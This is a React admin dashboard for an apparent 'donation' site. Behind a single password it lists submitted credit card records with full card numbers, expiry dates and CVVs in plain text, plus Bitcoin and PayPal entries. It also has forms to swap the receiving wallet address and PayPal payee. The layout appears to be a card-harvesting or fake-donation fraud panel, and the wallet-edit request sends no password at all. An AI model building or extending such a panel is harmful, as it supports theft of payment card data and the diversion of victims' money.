import React, { useState } from "react"

const AdminDashboard = () => {
  const [activeTab, setActiveTab] = useState("credit-card")
  const [formData, setFormData] = useState([])
  const [btcData, setBtcData] = useState([])
  const [paymentData, setPaymentData] = useState([])
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [password, setPassword] = useState("")
  const [error, setError] = useState(null)
  const [isLoading, setIsLoading] = useState(false)
  const [btcWalletAddress, setBtcWalletAddress] = useState("")
  const [paypalDetails, setPaypalDetails] = useState({
    email: "",
    receiverName: "",
    paymentNote: "",
  })
  const [isEditingBtc, setIsEditingBtc] = useState(false)
  const [isEditingPaypal, setIsEditingPaypal] = useState(false)

  const handleFetchData = async () => {
    if (!password) {
      setError("Password is required.")
      return
    }

    setError(null)
    setIsLoading(true)

    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}form/get-form-data`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ password }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        setError(errorData.error || "Failed to fetch data.")
        setIsLoading(false)
        return
      }

      const data = await response.json()
      setFormData(data.formData || [])
      setBtcData(data.btcData || [])
      setPaymentData(data.paymentData || [])
      setIsAuthenticated(true)
    } catch (err) {
      setError("An error occurred. Please try again.")
    } finally {
      setIsLoading(false)
    }
  }

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString()
  }

  const handleEditBtcWallet = async () => {
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}form/edit-btc-wallet-address`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ newBtcWalletAddress: btcWalletAddress }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        setError(errorData.error || "Failed to update BTC wallet address.")
        return
      }

      const data = await response.json()
      alert(data.message)
      setIsEditingBtc(false)
    } catch (err) {
      setError("An error occurred. Please try again.")
    }
  }

  const handleEditPaypalDetails = async () => {
    if (!password) {
      setError("Password is required for this action.")
      return
    }

    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}form/edit-paypal-details`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          password,
          newPaypalEmail: paypalDetails.email,
          newReceiverName: paypalDetails.receiverName,
          newPaymentNote: paypalDetails.paymentNote,
        }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        setError(errorData.error || "Failed to update PayPal details.")
        return
      }

      const data = await response.json()
      alert(data.message)
      setPaypalDetails({
        email: "",
        receiverName: "",
        paymentNote: "",
      })
      setIsEditingPaypal(false)
    } catch (err) {
      setError("An error occurred. Please try again.")
    }
  }

  const renderBitcoinTable = () => (
    <div className="overflow-x-auto">
      <table className="min-w-full divide-y divide-gray-200">
        <thead className="bg-pink-200">
          <tr>
            <th>Date</th>
            <th>Wallet Address</th>
            <th>Amount</th>
            <th>Country</th>
          </tr>
        </thead>
        <tbody className="bg-white divide-y divide-gray-200">
          {btcData.map((entry) => (
            <tr key={entry._id}>
              <td>{formatDate(entry.createdAt)}</td>
              <td>{entry.walletAddress}</td>
              <td>${entry.amount}</td>
              <td>{entry.country}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )

  const renderPaypalTable = () => (
    <div className="overflow-x-auto">
      <table className="min-w-full divide-y divide-gray-200">
        <thead className="bg-indigo-200">
          <tr>
            <th>Date</th>
            <th>PayPal Email</th>
            <th>Receiver Name</th>
            <th>Amount</th>
            <th>Country</th>
            <th>Payment Note</th>
          </tr>
        </thead>
        <tbody className="bg-white divide-y divide-gray-200">
          {paymentData.map((entry) => (
            <tr key={entry._id}>
              <td>{formatDate(entry.createdAt)}</td>
              <td>{entry.paypalEmail}</td>
              <td>{entry.receiverName}</td>
              <td>${entry.amount}</td>
              <td>{entry.country}</td>
              <td>{entry.paymentNote}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )

  const renderTable = () => {
    if (isLoading) return <p>Loading data...</p>
    if (error) return <p className="text-red-500">{error}</p>

    if (activeTab === "credit-card") {
      return (
        <div className="overflow-x-auto">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-purple-200">
              <tr>
                <th>Date</th>
                <th>Card Holder</th>
                <th>Card Number</th>
                <th>Expiry Date</th>
                <th>CVV</th>
                <th>Amount</th>
                <th>Country</th>
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {formData.map((entry) => (
                <tr key={entry._id}>
                  <td>{formatDate(entry.createdAt)}</td>
                  <td>{entry.cardHolder}</td>
                  <td>{entry.cardNumber}</td>
                  <td>{entry.expiryDate}</td>
                  <td>{entry.cvv}</td>
                  <td>${entry.amount}</td>
                  <td>{entry.country}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )
    }

    if (activeTab === "bitcoin") {
      return (
        <div>
          {renderBitcoinTable()}
          <button onClick={() => setIsEditingBtc(true)} className="bg-blue-500 text-white px-4 py-2 rounded mt-4">
            Edit BTC Wallet Address
          </button>
          {isEditingBtc && (
            <div>
              <h2>Edit Bitcoin Wallet Address</h2>
              <input
                type="text"
                placeholder="New BTC Wallet Address"
                value={btcWalletAddress}
                onChange={(e) => setBtcWalletAddress(e.target.value)}
                className="p-2 border mb-4"
              />
              <button onClick={handleEditBtcWallet} className="bg-green-500 text-white px-4 py-2 rounded">
                Save
              </button>
              <button onClick={() => setIsEditingBtc(false)} className="bg-red-500 text-white px-4 py-2 rounded ml-2">
                Cancel
              </button>
            </div>
          )}
        </div>
      )
    }

    if (activeTab === "paypal") {
      return (
        <div>
          {renderPaypalTable()}
          <button onClick={() => setIsEditingPaypal(true)} className="bg-blue-500 text-white px-4 py-2 rounded mt-4">
            Edit PayPal Details
          </button>
          {isEditingPaypal && (
            <div>
              <h2>Edit PayPal Details</h2>
              <input
                type="text"
                placeholder="New PayPal Email"
                value={paypalDetails.email}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, email: e.target.value })}
                className="p-2 border mb-2"
              />
              <input
                type="text"
                placeholder="Receiver Name"
                value={paypalDetails.receiverName}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, receiverName: e.target.value })}
                className="p-2 border mb-2"
              />
              <input
                type="text"
                placeholder="Payment Note"
                value={paypalDetails.paymentNote}
                onChange={(e) => setPaypalDetails({ ...paypalDetails, paymentNote: e.target.value })}
                className="p-2 border mb-4"
              />
              <button onClick={handleEditPaypalDetails} className="bg-green-500 text-white px-4 py-2 rounded">
                Save
              </button>
              <button
                onClick={() => setIsEditingPaypal(false)}
                className="bg-red-500 text-white px-4 py-2 rounded ml-2"
              >
                Cancel
              </button>
            </div>
          )}
        </div>
      )
    }
  }

  if (!isAuthenticated) {
    return (
      <div className="flex flex-col items-center justify-center h-screen">
        <h1 className="text-2xl mb-4">Admin Login</h1>
        <input
          type="password"
          placeholder="Enter Admin Password"
          className="p-2 border mb-4"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button onClick={handleFetchData} className="bg-blue-500 text-white px-4 py-2 rounded">
          {isLoading ? "Authenticating..." : "Login"}
        </button>
        {error && <p className="text-red-500 mt-2">{error}</p>}
      </div>
    )
  }

  return (
    <div className="container mx-auto p-4">
      <div className="flex space-x-4 mb-4">
        <button
          onClick={() => setActiveTab("credit-card")}
          className={`px-4 py-2 rounded ${activeTab === "credit-card" ? "bg-purple-500 text-white" : "bg-gray-200"}`}
        >
          Credit Card Donations
        </button>
        <button
          onClick={() => setActiveTab("bitcoin")}
          className={`px-4 py-2 rounded ${activeTab === "bitcoin" ? "bg-pink-500 text-white" : "bg-gray-200"}`}
        >
          Bitcoin Donations
        </button>
        <button
          onClick={() => setActiveTab("paypal")}
          className={`px-4 py-2 rounded ${activeTab === "paypal" ? "bg-indigo-500 text-white" : "bg-gray-200"}`}
        >
          PayPal Donations
        </button>
      </div>
      {renderTable()}
    </div>
  )
}

export default AdminDashboard